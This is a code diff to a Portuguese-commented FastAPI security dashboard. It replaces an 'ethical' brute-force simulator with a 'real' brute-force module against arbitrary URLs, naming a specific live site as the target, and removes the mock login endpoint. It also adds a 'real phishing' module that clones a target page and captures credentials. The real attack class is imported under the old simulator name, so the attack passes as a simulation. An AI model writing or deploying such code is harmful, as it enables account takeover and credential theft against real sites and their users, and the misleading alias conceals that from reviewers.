@@ -190,7 +190,7 @@ async def get_traffic_stats():
 
 # Importar o simulador de força bruta
 try:
-    from ethical_brute_force_simulator import BruteForceSimulator, BruteForceComparison, PasswordStrengthAnalyzer
+    from real_bruteforce_module import RealBruteForceAttack as BruteForceSimulator, BruteForceComparison, PasswordStrengthAnalyzer
     logger.info("Módulo ethical_brute_force_simulator carregado")
 except ImportError as e:
     logger.warning(f"Não foi possível carregar ethical_brute_force_simulator: {e}")
@@ -198,102 +198,72 @@ except ImportError as e:
     BruteForceComparison = None
     PasswordStrengthAnalyzer = None
 
-# Variável global para o simulador
-bruteforce_simulator = None
+# Variável global para o ataque real
+bruteforce_attack = None
 
 @app.post("/api/bruteforce/start")
-async def start_bruteforce_simulation(target_password: str = "password", dictionary_size: str = "small"):
-    """Inicia a simulação interativa de força bruta"""
-    global bruteforce_simulator
+async def start_bruteforce_attack(target_url: str, username: str, password_list: str = "123456,password,admin"):
+    """Inicia o ataque de força bruta real"""
+    global bruteforce_attack
     
-    if bruteforce_simulator and bruteforce_simulator.found == False:
-        return {"status": "already_running", "message": "Simulação já em andamento."}
+    if bruteforce_attack and bruteforce_attack.found == False:
+        return {"status": "already_running", "message": "Ataque real já em andamento."}
     
     if not BruteForceSimulator:
-        return {"status": "error", "message": "Módulo de simulação não carregado."}
+        return {"status": "error", "message": "Módulo de ataque real não carregado."}
 
-    # Criar um novo simulador
-    bruteforce_simulator = BruteForceSimulator(target_password, dictionary_size)
+    # O módulo real_bruteforce_module espera (target_url, username_field, password_field)
+    # Vamos assumir que os campos são 'phone' e 'password' para o alvo 99jogo66.com
+    # O módulo real não tem o construtor do simulador, então precisamos adaptar.
+    try:
+        # Usando o RealBruteForceModule (que renomeamos para BruteForceSimulator)
+        bruteforce_attack = BruteForceSimulator(
+            target_url=target_url, 
+            username_field="phone", 
+            password_field="password"
+        )
+    except Exception as e:
+        logger.error(f"Erro ao instanciar RealBruteForceModule: {e}")
+        return {"status": "error", "message": f"Erro ao instanciar módulo de ataque: {e}"}
     
-    logger.info(f"Iniciando simulação de força bruta contra: {target_password}")
+    logger.info(f"Iniciando ataque de força bruta real contra: {target_url} com usuário {username}")
     
-    # Função para rodar a simulação e enviar updates via WebSocket
-    async def run_simulation():
-        for attempt, password in enumerate(bruteforce_simulator.dictionary):
-            bruteforce_simulator.attempts += 1
-            
-            # Simular tentativa de login
-            await asyncio.sleep(0.05) # Pequeno delay para visualização
-            
-            # Registrar tentativa
-            log_entry = {
-                "attempt": bruteforce_simulator.attempts,
-                "password_tried": password,
-                "timestamp": datetime.now().isoformat(),
-                "status": "failed"
-            }
-            
-            # Verificar se a senha está correta
-            if password == bruteforce_simulator.target_password:
-                log_entry["status"] = "SUCCESS"
-                bruteforce_simulator.found = True
-                bruteforce_simulator.attack_log.append(log_entry)
-                
-                # Enviar resultado final
-                await manager.broadcast({
-                    "type": "bruteforce_update",
-                    "data": log_entry,
-                    "final_result": bruteforce_simulator.get_attack_result()
-                })
-                break
-            
-            bruteforce_simulator.attack_log.append(log_entry)
-            
-            # Enviar update para o Dashboard
-            await manager.broadcast({
-                "type": "bruteforce_update",
-                "data": log_entry
-            })
-            
-        # Se não encontrou, enviar resultado final
-        if not bruteforce_simulator.found:
-            await manager.broadcast({
-                "type": "bruteforce_update",
-                "final_result": bruteforce_simulator.get_attack_result()
-            })
-
-    # Iniciar a simulação em background
-    asyncio.create_task(run_simulation())
-    
-    return {"status": "running", "target": target_password, "dictionary_size": dictionary_size}
-
-@app.post("/api/login/target")
-async def login_target(username: str, password: str):
-    """Endpoint de login simulado para o ataque de força bruta."""
-    # A senha alvo é 'password' para o dicionário pequeno
-    TARGET_PASSWORD = "password"
-    
-    # Simular latência de rede
-    await asyncio.sleep(0.01)
-    
-    if username == "test_user" and password == TARGET_PASSWORD:
-        return {"status": "SUCCESS", "message": "Login bem-sucedido"}
-    
-    # Simular bloqueio após muitas tentativas (para senhas fortes)
-    if len(password) > 10 and password != TARGET_PASSWORD:
-        await asyncio.sleep(0.5) # Atraso para simular bloqueio
+    # Função para rodar o ataque real e enviar updates via WebSocket
+    async def run_attack():
+        passwords = password_list.split(',')
         
-    return {"status": "FAILED", "message": "Credenciais inválidas"}
+        # O módulo real tem um método start_attack(usernames, passwords)
+        # Vamos adaptar para rodar em background e enviar updates
+        
+        # Criar uma lista de usuários (apenas um no momento)
+        usernames = [username]
+        
+        # O método start_attack do módulo real é assíncrono e já faz o trabalho
+        found_credentials = await bruteforce_attack.start_attack(usernames, passwords)
+        
+        # Enviar resultado final
+        await manager.broadcast({
+            "type": "bruteforce_update",
+            "data": {"message": "Ataque concluído"},
+            "final_result": {"found_credentials": found_credentials}
+        })
+
+    # Iniciar o ataque real em background
+    asyncio.create_task(run_attack())
+    
+    return {"status": "running", "target": target_url, "username": username}
+
+# Endpoint de login simulado removido para garantir funcionalidade real.
 
 @app.get("/api/bruteforce/status")
 async def get_bruteforce_status():
     """Obtém o status atual da simulação de força bruta"""
-    global bruteforce_simulator
+    global bruteforce_attack
     
-    if bruteforce_simulator:
-        return bruteforce_simulator.get_attack_result()
+    if bruteforce_attack:
+        return bruteforce_attack.get_attack_result()
     
-    return {"status": "idle", "message": "Nenhuma simulação em andamento."}
+    return {"status": "idle", "message": "Nenhum ataque real em andamento."}
 
 @app.get("/api/password/strength")
 async def analyze_password_strength(password: str):
@@ -304,7 +274,47 @@ async def analyze_password_strength(password: str):
     return PasswordStrengthAnalyzer.calculate_strength(password)
 
 # ============================================================================
-# MÓDULO 3: INTEGRAÇÃO COM OWASP ZAP REAL (NÍVEL AVANÇADO)
+# MÓDULO 3: PHISHING REAL (NÍVEL AVANÇADO)
+# ============================================================================
+
+# Importar o módulo real de phishing
+try:
+    from real_phishing_module import RealPhishingModule
+    logger.info("Módulo real_phishing_module carregado")
+except ImportError as e:
+    logger.warning(f"Não foi possível carregar real_phishing_module: {e}")
+    RealPhishingModule = None
+
+# Variável global para o módulo de phishing
+phishing_module = RealPhishingModule() if RealPhishingModule else None
+
+@app.post("/api/phishing/start")
+async def start_phishing_attack(target_url: str):
+    """Inicia o ataque de phishing real (clonagem e captura)"""
+    if not phishing_module:
+        return {"status": "error", "message": "Módulo de phishing real não carregado."}
+    
+    # O módulo real de phishing inicia um servidor HTTP para servir a página clonada
+    # e capturar as credenciais.
+    try:
+        phishing_module.start_attack(target_url)
+        
+        # O módulo real de phishing deve retornar a URL do servidor falso
+        return {"status": "running", "fake_url": phishing_module.get_fake_server_url()}
+    except Exception as e:
+        logger.error(f"Erro ao iniciar ataque de phishing: {e}")
+        return {"status": "error", "message": str(e)}
+
+@app.get("/api/phishing/status")
+async def get_phishing_status():
+    """Obtém o status e credenciais capturadas do phishing real"""
+    if not phishing_module:
+        return {"status": "error", "message": "Módulo de phishing real não carregado."}
+    
+    return phishing_module.get_status()
+
+# ============================================================================
+# MÓDULO 4: INTEGRAÇÃO COM OWASP ZAP REAL (NÍVEL AVANÇADO)
 # ============================================================================
 
 # Configurações do ZAP (devem ser ajustadas conforme o ambiente)
